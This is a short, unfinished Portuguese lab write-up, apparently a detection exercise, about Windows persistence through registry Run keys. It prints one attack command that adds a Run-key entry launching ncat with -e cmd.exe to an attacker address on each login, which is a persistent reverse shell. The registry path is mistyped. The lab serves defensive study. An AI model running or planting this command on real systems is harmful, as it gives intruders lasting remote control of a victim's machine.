# Lab 02 - Persistência via Registry Keys
## Objetivo
Detectar uma tentativa de persistência via registros em ambiente Windows.
## Cenário Geral
Um atacante obteve acesso inicial ao host e executa tentativas de estabelecer persistência. Para isto, ele faz upload do ncat.exe em C:\ e executa o seguinte comando:
`reg add "HCKU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Persistence" /t REG_SZ /d "C:\Users\vboxuser\Downloads\ncat.exe 192.168.0.115 555 -e C:\Windows\System32\cmd.exe`
criando um registro de persistência no sistema para conectá-lo ao atacante a cada login do usuário VboxUser (usuário padrão do Virtualbox).
[WIP]
